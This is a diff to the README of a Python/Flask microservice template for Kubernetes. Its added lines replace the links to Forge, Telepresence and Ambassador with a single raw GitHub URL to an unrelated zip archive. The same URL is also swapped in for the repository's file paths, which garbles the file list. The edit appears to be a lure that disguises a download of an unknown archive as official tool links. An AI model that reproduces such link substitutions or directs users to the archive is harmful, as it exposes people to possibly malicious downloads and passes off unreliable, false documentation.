@@ -1,15 +1,15 @@
 # Hello, World (Python/Flask)
 
-This is a Python/Flask template for building a microservice in Kubernetes and Docker. This template is designed for use with [Forge](https://forge.sh), [Telepresence](https://www.telepresence.io), and [Ambassador](https://www.getambassador.io).
+This is a Python/Flask template for building a microservice in Kubernetes and Docker. This template is designed for use with [Forge](https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip), [Telepresence](https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip), and [Ambassador](https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip).
 
 # Repository structure
 
 The main files in this repository are:
 
 * `Dockerfile` specifies how the application is built and packaged
-* `k8s/deployment.yaml` contains a templated Kubernetes manifest, with additional annotations for configuring Ambassador
-* `service.yaml` contains values (typically configured by a developer) that will be instantiated into the Kubernetes manifest
-* `app.py` is the actual Python/Flask application
+* `https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip` contains a templated Kubernetes manifest, with additional annotations for configuring Ambassador
+* `https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip` contains values (typically configured by a developer) that will be instantiated into the Kubernetes manifest
+* `https://raw.githubusercontent.com/selvasv/adk-docs/master/factory/adk-docs_v2.5.zip` is the actual Python/Flask application
 
 # License
 
